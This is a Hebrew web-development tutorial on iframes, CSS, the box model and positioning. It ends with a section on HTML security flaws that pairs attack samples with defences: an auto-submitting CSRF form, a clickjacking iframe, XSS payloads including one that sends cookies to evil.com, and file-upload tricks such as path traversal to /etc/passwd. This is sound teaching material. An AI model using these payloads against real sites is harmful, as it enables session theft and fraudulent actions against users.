iframe - הטמעת תוכן חיצוני

הטמעת סרטוני YouTube, מפות Google, ודפים אחרים בתוך הדף שלך

מה זה ולמה?

iframe = Inline Frame. יוצר "חלון" בתוך הדף שמציג תוכן ממקור אחר. כמו מסגרת תמונה, רק עם דף אינטרנט בפנים.

YouTube - הטמעת סרטון

HTML <!-- ============================== --> <!-- הטמעת סרטון YouTube --> <!-- ============================== --> <!-- שימו לב: /embed/ ולא /watch?v= --> <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" width="560" <!-- רוחב בפיקסלים --> height="315" <!-- גובה בפיקסלים --> title="YouTube video" <!-- תיאור לנגישות --> frameborder="0" <!-- 0 = בלי מסגרת --> allowfullscreen <!-- מאפשר מסך מלא --> ></iframe> <!-- איך להשיג: YouTube > Share > Embed > Copy -->

Google Maps - הטמעת מפה

HTML <!-- ============================== --> <!-- הטמעת מפת Google Maps --> <!-- ============================== --> <iframe src="https://www.google.com/maps/embed?pb=!1m18..." width="100%" <!-- 100% = ממלא את כל הרוחב --> height="300" title="מיקום החנות" style="border: 0;" <!-- בלי גבול --> loading="lazy" <!-- טעינה עצלה = חוסך משאבים --> ></iframe> <!-- איך להשיג: Maps > Share > Embed a map -->

הטמעת דף HTML אחר מהאתר

HTML <!-- ============================== --> <!-- הטמעת דף אחר מהפרויקט שלי --> <!-- ============================== --> <h2>תצוגה מקדימה:</h2> <iframe src="products.html" <!-- דף מקומי! --> width="100%" height="500" title="דף מוצרים" ></iframe>
אבטחה: לא כל אתר מרשה הטמעה ב-iframe (Facebook, Google חוסמים). אבל דפים שלך - תמיד עובד.

CSS - שלוש שיטות הטמעה

Inline, Internal, External - הסברים מלאים עם קוד ותוצאה ויזואלית

מה זה CSS?

CSS = Cascading Style Sheets. שפה שמגדירה את המראה של HTML: צבעים, גופנים, גדלים, מרווחים, פריסה.

בלי CSS = טקסט שחור על רקע לבן. עם CSS = אתר מעוצב.

שיטה 1: Inline CSS

עדיפות: 1000 לבדיקות בלבד

כותבים style="..." ישירות על התגית. כל אלמנט בנפרד.

index.html <!-- ======================================= --> <!-- שיטה 1: INLINE CSS --> <!-- style="..." ישירות על כל תגית --> <!-- ======================================= --> <body> <!-- כותרת עם רקע, צבע, גודל, יישור --> <h1 style="color: white; background-color: peru; padding: 20px; text-align: center; border-radius: 10px; font-size: 32px;"> I have a dream! </h1> <!-- פסקה עם צבע וגופן --> <p style="color: royalblue; font-size: 20px; font-family: Georgia, serif;"> styled paragraph </p> <!-- בלי style = ברירת מחדל --> <p>no styling here</p> </body>

בתוך <style> לדף בודד

שיטה 3: External CSS (מומלצת!)

Best Practice קובץ נפרד

קובץ style.css נפרד, מקושר עם <link>. שינוי אחד = שינוי בכל האתר.

שני הקבצים זה לצד זה:

index.html <!DOCTYPE html> <html> <head> <title>My Site</title> <!-- קישור לקובץ CSS --> <link rel="stylesheet" href="style.css"> </head> <body> <h1 id="main">Welcome</h1> <p class="intro">Hello</p> <p class="intro">World</p> <a href="#" class="btn"> Click </a> </body> </html>
style.css /* ========================= */ /* EXTERNAL CSS FILE */ /* ========================= */ /* --- כל ה-body --- */ body { font-family: "Segoe UI"; background: #f0f4f8; padding: 20px; } /* --- ID: # --- */ #main { color: navy; font-size: 2.5em; text-align: center; border-bottom: 3px solid navy; } /* --- Class: . --- */ .intro { color: #475569; font-size: 18px; line-height: 1.8; } /* --- כפתור עם hover --- */ .btn { background: #4f46e5; color: white; padding: 12px 24px; border-radius: 8px; text-decoration: none; transition: all 0.3s; } .btn:hover { background: #3730a3; transform: translateY(-3px); }

The Box Model

כל אלמנט ב-HTML הוא קופסה מלבנית. 4 שכבות שחובה להכיר

מה זה Box Model?

ה-Box Model מתאר את המידות והרכיבים של כל אלמנט בדף. כל אלמנט HTML הוא קופסה שמורכבת מ-4 שכבות: Content, Padding, Border, Margin.

אפשר לראות את ה-Box Model של כל אלמנט בדפדפן: קליק ימני על אלמנט > Inspect > בצד ימין למטה רואים את הקופסה עם כל המידות.

4 השכבות - ויזואלי

Box Model /* ┌─────────────────────────────────────────┐ │ MARGIN (חיצוני) │ │ ┌───────────────────────────────────┐ │ │ │ BORDER (גבול) │ │ │ │ ┌─────────────────────────────┐ │ │ │ │ │ PADDING (פנימי) │ │ │ │ │ │ ┌───────────────────────┐ │ │ │ │ │ │ │ CONTENT │ │ │ │ │ │ │ │ (תוכן: טקסט/תמונה) │ │ │ │ │ │ │ └───────────────────────┘ │ │ │ │ │ └─────────────────────────────┘ │ │ │ └───────────────────────────────────┘ │ └─────────────────────────────────────────┘ */
שכבהמה עושהקוד CSS
Contentהתוכן עצמו (טקסט, תמונות)width: 300px; height: 200px;
Paddingמרווח פנימי - בין Content ל-Borderpadding: 20px;
Borderהגבול שמקיף את האלמנטborder: 2px solid red;
Marginמרווח חיצוני - בין האלמנט לסביבהmargin: 30px auto;

דוגמה מלאה - div עם Box Model

style.css /* ======================================= */ /* Box Model - div מרכזי עם כל השכבות */ /* ======================================= */ div { width: 300px; /* רוחב התוכן */ height: 200px; /* גובה התוכן */ padding: 20px; /* מרווח פנימי */ border: 4px solid red; /* גבול: עובי+סגנון+צבע */ border-radius: 8px; /* עיגול פינות */ margin: 30px auto; /* מרווח חיצוני + מרכוז */ background-color: black; } /* ======================================= */ /* box-sizing: border-box */ /* בלי זה: width = Content בלבד */ /* רוחב אמיתי = width + padding + border */ /* עם border-box: width כולל הכל! */ /* ======================================= */ * { box-sizing: border-box; /* Best Practice! */ }

CSS /* ======================================= */ /* MARGIN - מרווח חיצוני */ /* ======================================= */ margin: 10px; /* כל 4 הצדדים: 10px */ margin: 10px 20px; /* top/bottom: 10 | left/right: 20 */ margin: 10px 20px 30px 40px; /* top right bottom left (שעון) */ margin: 0 auto; /* מרכוז אופקי! */ /* או לפי צד ספציפי: */ margin-top: 10px; margin-right: 20px; margin-bottom: 30px; margin-left: 40px; /* ======================================= */ /* PADDING - מרווח פנימי */ /* אותו תחביר בדיוק כמו margin */ /* ======================================= */ padding: 15px; /* כל 4 הצדדים */ padding: 10px 30px; /* top/bottom | left/right */ padding-top: 50px; /* צד ספציפי */

div & span

<div> = Division. אלמנט Block - תופס שורה שלמה. משמש לחלוקה ולקיבוץ אלמנטים.

Block vs Inline

Block (תופס שורה שלמה)Inline (רק ברוחב הנדרש)
<div>, <h1>-<h6>, <p>, <form>, <section>, <header>, <nav>, <ul>, <li>, <table><span>, <a>, <img>, <strong>, <em>, <input>, <button>, <label>
Block = כל אחד בשורה חדשה, תופס את כל הרוחב. Inline = זורמים אחד ליד השני, תופסים רק את הרוחב הנדרש. אפשר לשנות עם display: inline או display: block.

Opacity - שקיפות

opacity שולט על השקיפות של אלמנט. ערכים מ-0 (שקוף לגמרי) עד 1 (נראה לגמרי). האלמנט עדיין תופס מקום בדף!

HTML <h1 style="opacity: 1">Im visible</h1> <!-- 100% נראה --> <h1 style="opacity: 0.3">Im almost invisible</h1> <!-- 30% --> <h1 style="opacity: 0">Im invisible</h1> <!-- 0% = שקוף -->

Static & Relative

CSS /* ======================================= */ /* STATIC = ברירת מחדל */ /* האלמנט בזרימה הרגילה של הדף */ /* top/left/right/bottom לא עובדים */ /* ======================================= */ .box-static { position: static; /* ברירת מחדל */ } /* ======================================= */ /* RELATIVE = הזזה יחסית למיקום המקורי */ /* הזרימה לא משתנה (המקום השמור נשאר) */ /* האלמנט יכול לחפוף אלמנטים אחרים */ /* ======================================= */ .box-relative { position: relative; top: 50px; /* זז 50px מלמעלה */ left: 30px; /* זז 30px משמאל */ }

Absolute & Fixed

CSS /* ======================================= */ /* ABSOLUTE = יוצא מהזרימה! */ /* ממוקם יחסית להורה הקרוב עם relative */ /* אם אין הורה relative = יחסית ל-body */ /* ======================================= */ .parent { position: relative; /* חובה! */ width: 300px; height: 200px; background: #ddd; } .child { position: absolute; top: 10px; /* 10px מלמעלה של ההורה */ right: 10px; /* 10px מימין של ההורה */ background: red; } /* ======================================= */ /* FIXED = קבוע לחלון הדפדפן */ /* לא זז גם בגלילה! */ /* שימוש: תפריט עליון, כפתור צף */ /* ======================================= */ .navbar { position: fixed; top: 0; left: 0; width: 100%; background: black; z-index: 100; /* מעל הכל */ }
Result
parent (relative)
child (absolute)
fixed navbar
Absolute חייב הורה Relative! בלי הורה עם position: relative, האלמנט ה-absolute ימוקם יחסית ל-body (כל הדף). זו טעות נפוצה.

Sticky

CSS /* ======================================= */ /* STICKY = שילוב של relative + fixed */ /* מתנהג כ-relative עד שמגיעים ל-top */ /* ואז "נדבק" כמו fixed */ /* ======================================= */ .sticky-header { position: sticky; top: 0; /* נדבק כשמגיע ל-top:0 */ background: white; padding: 10px; z-index: 10; }
דוגמה חיה: סרגל הלשוניות למעלה בדף הזה הוא sticky! הוא גולל עם הדף ואז נדבק למעלה.

z-index - מי מעל מי?

כשאלמנטים חופפים (absolute/fixed), z-index קובע מי מעל. מספר גבוה יותר = יותר למעלה.

CSS .box-back { position: absolute; z-index: 1; /* למטה */ } .box-front { position: absolute; z-index: 10; /* למעלה */ } .modal { position: fixed; z-index: 1000; /* מעל הכל */ }
z-index עובד רק על אלמנטים עם position (לא static). בלי position, z-index מתעלם.

Security - חולשות אבטחה ב-HTML

איך תוקף מנצל HTML, Forms, iframe ו-CSS - וקטורי תקיפה ודרכי הגנה

Hidden Fields - שדות מוסתרים

שדות type="hidden" לא נראים למשתמש, אבל קיימים ב-HTML. תוקף פותח DevTools (F12) ומשנה את הערכים.

וקטור: IDOR + Privilege Escalation

אם השרת סומך על hidden field בלי לאמת - התוקף שולט

vulnerable.html <!-- ========================================= --> <!-- שדות מוסתרים = וקטור תקיפה! --> <!-- התוקף פותח F12 ומשנה את הערכים --> <!-- ========================================= --> <form action="/transfer" method="POST"> <input type="hidden" name="user_id" value="1337"> <!-- ↑ תוקף משנה ל-value="1" (אדמין) --> <input type="hidden" name="price" value="99.99"> <!-- ↑ תוקף משנה ל-value="0.01" --> <input type="hidden" name="role" value="user"> <!-- ↑ תוקף משנה ל-value="admin" --> <!-- אם השרת מקבל = Privilege Escalation! --> <button type="submit">שלח</button> </form>

הגנה

השרת מזהה את המשתמש דרך Session/JWT - לא דרך hidden field. הרשאות נבדקות בצד שרת. מחיר נקרא מ-DB, לא מהטופס.

Client-Side Validation Bypass

כל הוולידציות של HTML (required, maxlength, pattern, type="email") הן בצד לקוח בלבד. תוקף עוקף אותן ב-3 שניות.

bypass.html <!-- ========================================= --> <!-- כל ההגנות האלה ניתנות לעקיפה ב-DevTools --> <!-- או ב-Burp Suite --> <!-- ========================================= --> <input type="email" required> <!-- DevTools: להסיר את required --> <!-- DevTools: לשנות type="email" ל-type="text" --> <!-- Burp: לשלוח בקשה ישירה בלי הדפדפן --> <input maxlength="10"> <!-- DevTools: להסיר את maxlength --> <!-- Burp: לשלוח 10,000 תווים ישירות --> <input pattern="[0-9]{3}"> <!-- DevTools: להסיר את pattern --> <!-- Burp: לשלוח <script>alert(1)</script> --> <form novalidate> <!-- ↑ תוקף מוסיף novalidate ב-DevTools --> <!-- ↑ מבטל את כל הוולידציות של הדפדפן -->

הגנה

ולידציה כפולה: Client-side (UX) + Server-side (אבטחה). השרת חייב לאמת כל שדה מחדש. לעולם לא לסמוך על הדפדפן.

GET vs POST - חשיפת מידע

GET - פגיע

/* המידע גלוי ב-URL! */ site.com/login?user=tzuki&pass=123 /* נשמר ב: */ /* - היסטוריית הדפדפן */ /* - לוגים של השרת */ /* - Referer header */ /* - Proxy logs */ /* - כל מי שעומד מאחורי המשתמש */
VS

POST - מאובטח

/* המידע בגוף הבקשה */ POST /login HTTP/1.1 Content-Type: application/x-www... user=tzuki&pass=123 /* לא נראה ב-URL */ /* לא בהיסטוריה */ /* עדיין צריך HTTPS! */
כלל: סיסמאות, כרטיסי אשראי, מידע רגיש = תמיד POST + HTTPS. GET רק לחיפוש ודפדוף.

CSRF - Cross-Site Request Forgery

תוקף יוצר דף עם טופס שנשלח אוטומטית לאתר אחר. אם המשתמש מחובר לאתר - הפעולה מתבצעת בשמו!

evil-site.html <!-- ========================================= --> <!-- CSRF Attack --> <!-- התוקף שם את הדף הזה באתר שלו --> <!-- כשהקורבן גולש לדף, הטופס נשלח אוטומטית --> <!-- ========================================= --> <!-- טופס שמעביר כסף בשם הקורבן --> <form action="https://bank.com/transfer" method="POST" id="evil"> <input type="hidden" name="to" value="attacker_account"> <input type="hidden" name="amount" value="10000"> </form> <!-- שליחה אוטומטית ברגע שהדף נטען --> <script> document.getElementById('evil').submit(); </script>

הגנה: CSRF Token

השרת מייצר token ייחודי לכל session ושם אותו בטופס. בשליחה, השרת בודק שה-token תקין. התוקף לא יכול לדעת את ה-token.

protected.html <form action="/transfer" method="POST"> <!-- CSRF Token - ייחודי לכל session --> <input type="hidden" name="csrf_token" value="a7f3b9c2e1d4..."> <!-- ↑ התוקף לא יכול לדעת את הערך הזה --> <!-- שאר השדות... --> </form>

iframe - Clickjacking

תוקף מטמיע את האתר שלך ב-iframe שקוף, ומניח מעליו כפתור מזויף. המשתמש חושב שהוא לוחץ על כפתור אחד, אבל בפועל לוחץ על הכפתור באתר שלך.

clickjack.html <!-- ========================================= --> <!-- Clickjacking Attack --> <!-- iframe שקוף מעל כפתור מזויף --> <!-- ========================================= --> <!-- הכפתור שהמשתמש "רואה" --> <button style="position:absolute; top:300px; left:100px; z-index: 1;"> Win a Prize! </button> <!-- iframe שקוף מעל הכפתור --> <iframe src="https://bank.com/delete-account" style="position:absolute; top:280px; left:80px; opacity: 0; /* ↑ שקוף לגמרי! המשתמש לא רואה */ z-index: 10; /* ↑ מעל הכפתור המזויף */ width:400px; height:200px;" ></iframe>

הגנה

Header בתגובת השרת: X-Frame-Options: DENY או Content-Security-Policy: frame-ancestors 'none'. מונע הטמעת האתר ב-iframe.

XSS - Cross-Site Scripting

תוקף מזריק קוד JavaScript דרך שדות טופס, URL, או תוכן שלא מסונן. הקוד רץ בדפדפן של קורבנות אחרים.

xss-vectors.html <!-- ========================================= --> <!-- XSS Attack Vectors --> <!-- ========================================= --> <!-- 1. Reflected XSS (ב-URL) --> site.com/search?q=<script>alert(document.cookie)</script> <!-- 2. Stored XSS (בשדה טופס) --> <!-- תוקף כותב בשדה "שם": --> <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)"> <!-- 3. DOM XSS (מניפולציה ב-JS) --> <!-- אם הדף משתמש ב-innerHTML עם קלט מהמשתמש: --> document.getElementById('output').innerHTML = userInput; <!-- ↑ userInput = <img src=x onerror=alert(1)> --> <!-- 4. XSS דרך img tag --> <img src="x" onerror="alert('XSS')"> <!-- ↑ התמונה לא קיימת --> <!-- ↑ onerror מפעיל JavaScript --> <!-- 5. XSS דרך a tag --> <a href="javascript:alert('XSS')">Click</a> <!-- 6. XSS דרך iframe srcdoc --> <iframe srcdoc="<script>alert('XSS')</script>"></iframe>

הגנה

Input Sanitization: לסנן תווים מסוכנים (< > " ' &) בכל קלט.
Output Encoding: להמיר תווים ל-HTML entities לפני הצגה.
CSP Header: Content-Security-Policy: script-src 'self' - מונע הרצת scripts חיצוניים.
HttpOnly Cookies: מונע גישת JavaScript לעוגיות.

File Upload - העלאת קבצים מסוכנים

upload.html <!-- ========================================= --> <!-- File Upload Vulnerabilities --> <!-- ========================================= --> <!-- accept הוא רק UI hint, לא הגנה! --> <input type="file" name="avatar" accept="image/png, image/jpeg"> <!-- מה תוקף עושה: --> <!-- --> <!-- 1. מעלה shell.php במקום תמונה --> <!-- 2. מעלה shell.php.jpg (double extension) --> <!-- 3. משנה Content-Type ב-Burp --> <!-- 4. path traversal בשם: ../../etc/passwd --> <!-- 5. magic bytes: תוכן PHP עם header של PNG -->

הגנה

בדיקת Magic Bytes בצד שרת (לא MIME type).
שם קובץ חדש - לא להשתמש בשם שהמשתמש נתן.
תיקייה נפרדת בלי הרשאות הרצה.
הגבלת גודל בצד שרת.
